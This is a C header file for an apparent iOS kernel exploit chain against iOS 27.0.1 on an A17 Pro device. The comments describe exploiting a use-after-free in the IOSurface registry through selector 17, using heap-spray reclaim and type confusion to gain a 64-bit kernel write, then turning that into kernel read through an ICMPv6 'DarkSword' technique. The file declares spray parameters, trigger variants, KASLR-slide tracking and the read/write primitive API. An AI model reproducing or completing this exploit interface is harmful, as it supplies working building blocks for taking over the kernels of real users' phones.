// CVE-2026-112477 IOSurface Registry UAF → kwrite64 → DarkSword kread
//
// IOSurfaceRoot selector 17 (async) registers a node into root's registry.
// After IOServiceClose the node's owner pointer dangles. A subsequent
// registry traversal dereferences freed memory → UAF in kalloc.1024.
// Fixed in iOS 27.2: sticky "detached" flag at +0xf1 blocks re-registration.
//
// Exploitation chain:
//   trigger UAF → reclaim with controlled IOSurface → type confusion on
//   property pointer → kwrite64 → hostname bootstrap → DarkSword kread64
//
// Target: iOS 27.0.1 (24A446) — iPhone17,2 / A17 Pro
#ifndef IOSURFACE_UAF_H
#define IOSURFACE_UAF_H

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

// --- Selector numbers ---
#define ISRACE_SEL_REG   17
#define ISRACE_SEL_DEREG 18

// --- Spray parameters ---
#define ISRACE_SPRAY_CONNS     64
#define ISRACE_RECLAIM_SURFS   512
#define ISRACE_DEFRAG_SURFS    128
#define ISRACE_MAX_ATTEMPTS    5
#define ISRACE_RECLAIM_ATTEMPTS 3

// --- Type confusion / reclaim constants ---
#define ISRACE_MARKER_MAGIC       0xD3ADB33F
#define ISRACE_PROP_KEY_TAG       "israce_tag"
#define ISRACE_KALLOC_1024_SIZE   1024

// --- Trigger variant IDs ---
#define ISRACE_VARIANT_TEARREG   1
#define ISRACE_VARIANT_LOCKDEG   2
#define ISRACE_VARIANT_REREG     3
#define ISRACE_VARIANT_COMBINED  4

typedef void (*israce_log_fn)(const char *line);

typedef struct {
    bool     triggered;
    bool     reclaimed;
    bool     kread_possible;
    bool     kwrite_active;
    uint64_t dangling_owner_kaddr;
    uint64_t reclaim_region;
    uint32_t reclaim_offset;
    uint64_t kwrite_test_addr;
    uint64_t reclaim_surface_id;
    int      trigger_variant;
    uint32_t attempts;
    uint32_t panic_averted;
    uint32_t sel17_rc;
    uint32_t reregister_rc;
    uint32_t reclaim_spray_count;
    uint64_t kaslr_slide_derived;
} israce_result_t;

// --- Setup ---
void israce_set_log(israce_log_fn fn);
void israce_set_kaslr(uint64_t slide);

// --- Trigger + reclaim (phases 0-5) ---
void israce_run(israce_result_t *result);

// --- kwrite primitive (phase 6) ---
void israce_set_kwrite_target(uint64_t addr, uint64_t val);
bool israce_kwrite64(uint64_t addr, uint64_t val);
bool israce_kwrite32(uint64_t addr, uint32_t val);
bool israce_has_kwrite(void);

// --- Full chain activation (phase 6) ---
// kwrite → ICMPv6 two-socket redirect → kread
bool israce_activate_darksword(uint64_t slide);

// --- kread via DarkSword (after activate_darksword succeeds) ---
uint64_t israce_kread64(uint64_t addr);
bool israce_kread_32bytes(uint64_t addr, void *out);

// --- Cleanup ---
void israce_cleanup(void);

#endif
